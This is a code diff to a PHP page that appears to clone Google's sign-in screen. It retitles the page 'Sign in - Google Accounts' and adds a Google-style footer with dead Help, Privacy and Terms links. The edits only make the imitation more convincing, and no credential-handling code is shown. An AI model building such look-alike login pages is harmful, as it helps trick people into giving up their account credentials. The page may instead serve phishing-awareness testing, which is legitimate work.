@@ -16,7 +16,7 @@ require_once('helper.php');
           }
         </script>
 
-        <title>Google</title>
+        <title>Sign in - Google Accounts</title>
         <!-- JQuery and Bootstrap -->
 
         <script src='assets/js/jquery-3.4.1.min.js'></script>
@@ -111,6 +111,22 @@ require_once('helper.php');
                 </div>
             </div>
         </div>
+        <footer class="g-footer">
+            <div class="g-footer-lang">
+                <div class="g-footer-lang-select">
+                    <select class="g-footer-select" aria-label="Change language" id="lang-select">
+                        <option value="en-US" selected>English (United States)</option>
+                        <option value="en-GB">English (United Kingdom)</option>
+                    </select>
+                    <svg class="g-footer-arrow" id="lang-arrow" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="#5f6368" pointer-events="none"><path d="M7 10l5 5 5-5z"/></svg>
+                </div>
+            </div>
+            <div class="g-footer-links">
+                <a href="#" class="g-footer-link">Help</a>
+                <a href="#" class="g-footer-link">Privacy</a>
+                <a href="#" class="g-footer-link">Terms</a>
+            </div>
+        </footer>
     </body>
 </html>
 <script type="text/javascript">
